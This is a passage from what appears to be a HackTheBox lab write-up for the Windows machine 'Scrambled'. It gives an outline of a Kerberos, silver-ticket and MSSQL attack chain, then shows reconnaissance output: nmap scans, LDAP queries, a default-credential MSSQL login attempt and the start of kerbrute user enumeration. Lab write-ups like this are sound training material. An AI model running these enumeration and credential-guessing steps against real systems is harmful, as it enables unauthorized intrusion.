---
description: >-
  Scrambled HTB Machine
title: Scrambled (Medium)                # Add title here
date: 2023-05-10 08:00:00 -0600                           # Change the date to match completion date
categories: [HackTheBox, Windows - Medium]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Scrambled.png                # Add infocard image here for post preview image
---
### Host entries:
```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.168    scrm.local dc1.scrm.local  
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- LDAP Enumeration
- Web Enumeration
- Information Leakage
- Kerberos Enumeration
- Kerbrute Password Brute Force
- Kerbrute SMB Enumeration
- Kerberos Authentication [getTGT.py]
- ASREPRoast Attack - GetNPUsers.py (Failed)
- Kerberoasting Attack - GetUserSPNs.py Manipulating the GetUserSPNs.py script to make it work the way we want it to work
- Cracking Hashes
- Attempting to authenticate to the MSSQL service via kerberos (Failed)
- Explaining Kerberos Auth Flow (TGT, TGS, KDC, AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP)
- Explaining how Silver Ticket Attack works
- Silver ticket attack. Forging a new TGS as Administrator user (NTLM Hash, Domain SID and SPN) ticketer.py && getPAC.py
- CCACHE Technique Connecting to the MSSQL service with the newly created ticket
- MSSQL Enumeration
- Enabling xp_cmdshell component in MSSQL [RCE]
- Abusing SeImpersonatePrivilege [JuicyPotatoNG Alternative for Windows Server 2019](https://github.com/antonioCoco/JuicyPotatoNG) (Unintended Way)
- Binary and DLL Analysis
- Downloading OpenVPN from a Windows machine and configuring it to reverse downloaded resources
- Dnspy Installation
- DLL Inspection with Dnspy - Found a backdoor in the code
- We realize that serialization and deserialization of data is being used
- Creating a malicious base64 serialized Payload with ysoserial.net in order to get RCE and send the serialized data to the server [Privilege Escalation]

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.11.168
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.168 ()   Status: Up
Host: 10.10.11.168 ()   Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 4411/open/tcp//found///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49702/open/tcp/////, 49708/open/tcp/////
```
Services and Versions running:
```bash
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49702,49708 -sCV -Pn -n -vvvv -oN targeted 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up, received user-set (0.17s latency).
Scanned at 2023-05-10 07:31:40 CST for 202s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-05-10 13:31:50Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-10T13:35:01+00:00; +2s from scanner time.
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:35:01+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA=
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T13:24:40
| Not valid after:  2053-05-10T13:24:40
| MD5:   e20b01df632b9feb944ab29cbee4d450
| SHA-1: af8d070fd6c630d9ac1b9658013f40791baa6774
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQV/XRdaFZfLNEH2wUtD2+XTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMwNTEwMTMyNDQwWhgPMjA1MzA1MTAxMzI0NDBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOyqKrAe
| 5JOpdfM65308pfZiuBJzg07crdiygOURbzeykFutLynTeHIyZI5dpPCZLfo3A3KM
| KJl9L3L7i8BhsAMoL/m2SBYjsTnZ6h5aY+JngqcxVJaOQ4nIpZWGLJvIHeGZrUcb
| N6yKXvdLkuxOSTjXoWiSZ6jpkbBdJ2q65D/22KO2GcPMsa7qzkykvx/HEN8PsCYp
| eQc2Id6pa783uds4icd+QD7NbAi3yxzpdOYVjpsd3l7Arvc3sJ0An8t+q/Udrj3C
| 5gbMb0sfE5CuqkDwlEg5MZjAfKCVJDQqXPrbMQC1pwj1qoxEcvtwhb6BWW/GZoTV
| KnQFDsNkCFy+lPUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAmJ5tJe/Re3IkFF70
| vIQRgxN0rzXOPQIKRk9APEm7L36spNXLqxrFJZpPjshFmNrev38mx9KqRFMq9ErL
| rRzT+93x8QajIUjCuZYgxo4tJg3AflirgVhMqjZpREPROWWq0zkznskw6DF1l59R
| LsoVIzuwTy1qGMaNKQg/JXoMBqsxx9TUT7xM/cIcmqff4gzy7PMTv+vgL7tVCIHh
| W+NNRwlpLj4jdf42Gf4PcXVGtGpa7qSf0pE9QFM68qU7/jl+dK2PR1eNxT5iu2fc
| 8feJ+ttsXThvNL8P9toTVV0MkhJLY4jH74HMBlkBuL1sihaqsp08+29KS9Srt+re
| /JyRcg==
|_-----END CERTIFICATE-----
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-05-10T13:35:01+00:00; +2s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-10T13:35:01+00:00; +2s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:35:01+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA=
|_-----END CERTIFICATE-----
4411/tcp  open  found?        syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Crackmapexec output:
```bash
crackmapexec smb 10.10.11.168          
SMB 10.10.11.168 445 NONE [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
```

There is a hostname in the port LDAP 3269:
```bash
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
```

Adding this to the /etc/hosts for further attacks:
```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.168    DC1.scrm.local scrm.local
```

Enumeration with LDAP basic query: [^ldap-enum]
```bash
ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Enumeration (failed) with LDAP query to retrieve users:

```bash
ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts -b "dc=scrm,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=scrm,dc=local> with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Trying to connect to database using domain controller: ^8adc8a
```bash
impacket-mssqlclient scrm.local/sa:sa@10.10.11.168
```

Kerberos user enumeration with kerbrute:
```bash
kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Kerberos/A-ZSurnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
